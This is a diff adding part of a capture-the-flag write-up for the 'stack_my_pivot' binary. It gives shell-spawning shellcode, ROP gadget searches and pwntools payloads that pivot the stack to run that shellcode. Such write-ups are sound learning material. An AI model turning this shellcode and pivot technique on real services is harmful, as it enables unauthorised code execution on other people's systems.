@@ -185,5 +185,121 @@ We also know that *%rip* is at offset 24/
 rip_offset = 24
 ```
 
+We know that the stack is executable so let's put some shellcode inside the first buffer
+
+``` python
+def send_shellcode():
+    shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05" #shellcraft.sh() has invalid chars
+
+    log.info("sending shellcode")
+    io.sendline(shellcode)
+```
+
+shellcode is from ["shellstorm"](http://shell-storm.org/shellcode/files/shellcode-905.php)
+
+Now we fill the first buffer with shellcode, let's jump to it.
+
+We need to modify %rsp% to point at the first buffer.
+After the overflow the function leaves and calls main so the 4 higher byter of *%rsi* will be all zeroes so we can use a gadget in this range by overwriting the four lower bytes.
+
+What gadgets do we have:
+
+> ROPgadget --binary ./stack_my_pivot
+
+There's a lot so let focus on what we want.
+We want *%rsp* to point at one of the buffers since it is where we can execute code. 
+Good news *%rsi* contains the address of the second buffer.
+
+Let's see if we can use that.
+
+> ROPgadget --binary ./stack_my_pivot | grep "rsi"
+
+```
+0x0000000000400730 : mov ebp, esp ; xchg rsp, rsi ; nop ; pop rbp ; ret
+0x000000000040072f : mov rbp, rsp ; xchg rsp, rsi ; nop ; pop rbp ; ret
+0x0000000000400831 : pop rsi ; pop r15 ; ret
+0x000000000040072e : push rbp ; mov rbp, rsp ; xchg rsp, rsi ; nop ; pop rbp ; ret
+0x0000000000400732 : xchg rsp, rsi ; nop ; pop rbp ; ret
+```
+
+Good that's a lot less. Last one seems intresting.
+xchg exchanges the value of two registers, sweet we can make *%rsp* point at our second buffer and the *ret* instruction will load it inside *%rip*.
+Only thing is, *pop* increases the value of *%rsp* by 8, we loose 8bytes of our already tiny buffer, well we will have to do like that.
+
+So now we can go to *%rsp* the problem being we want to go to what's inside it, we need a *jmp rsp*, conveniently there is one.
+
+> ROPgadget --binary ../stack_my_pivot | grep "jmp" | grep "rsp"
+
+```
+0x0000000000400738 : jmp rsp
+```
+
+Great, so in theory we have what we need to execute some code inside the seconde buffer. Let's see what it looks like in pwntools:
+
+``` python
+
+jmp_rsp = 0x400738 #jmp rsp gadget
+gadget = 0x400732  # exch rsi, rsp; pop rbp; ret
+
+def send_payload():
+    payload = 8 * b'\x90' #The pop rbp adds 8 to rsp so this instruction is ignored
+    payload += p64(jmp_rsp) #Jmp rsp gadget which allows us to execute code
+    payload += 8 * b'\x90' # 8bytes of code we can actually write
+    payload += p64(gadget) # exch rsi, rsp; pop rbp; ret
+
+    log.info("sending payload")
+    io.sendline(payload)
+```
+
+Now with the 8 bytes of instructions we have we need to set *%rsp* so the value of the first bigger buffer and jump to it.
+
+Both buffers are on the stack, so they will always have the same distance between them.
+
+![alt text](./screenshots/buffers_difference.png "buffer difference")
+
+Oh ghidra how did people do before you came out.
+
+So the first buffer that contains our shellcode is always *0x40* before the second.
+
+So now we have everything we need, we substract 0x40 from *%rsp* and jmp to it.
+
+```
+def send_payload():
+    payload = 8 * b'\x90' #The pop rbp adds 8 to rsp so this instruction is ignored
+    payload += p64(jmp_rsp) #Jmp rsp gadget which allows us to execute code
+    payload += asm("sub rsp,0x40; jmp rsp; nop; nop")
+    payload += p64(gadget) # exch rsi, rsp; pop rbp; ret
+
+    log.info("sending payload")
+    io.sendline(payload)
+```
+
+We had two *nop* so that the payload stays aligned.
+So yay it should work, well it doesn't.
+
+The pop which occurs after the register exchange added 8 to *%rsp* and the *ret* instruction added 2.
+
+
+```
+def send_payload():
+    payload = 8 * b'\x90' #The pop rbp adds 8 to rsp so this instruction is ignored
+    payload += p64(jmp_rsp) #Jmp rsp gadget which allows us to execute code
+    payload += asm("sub rsp,0x50; jmp rsp; nop; nop")
+    payload += p64(gadget) # exch rsi, rsp; pop rbp; ret
+
+    log.info("sending payload")
+    io.sendline(payload)
+```
+
+![alt text](./screenshots/pwn.png "pwned")
+
+## Win
+
+Yes, I had a lot of trouble on this challenge and spent a whole night on it. There were no writeups online so I really had to struggle but I learned a lot.
+
+Full exploit is on the repo but you should try to redo it by yourself.
+
+*kisses Pim*
+
 ## Thanks
 I was really stuck on this challenge and the creator [Razvi](https://twitter.com/Razvieu) had the kindness of helping me ! Thanks to him for his time and for the challenge.
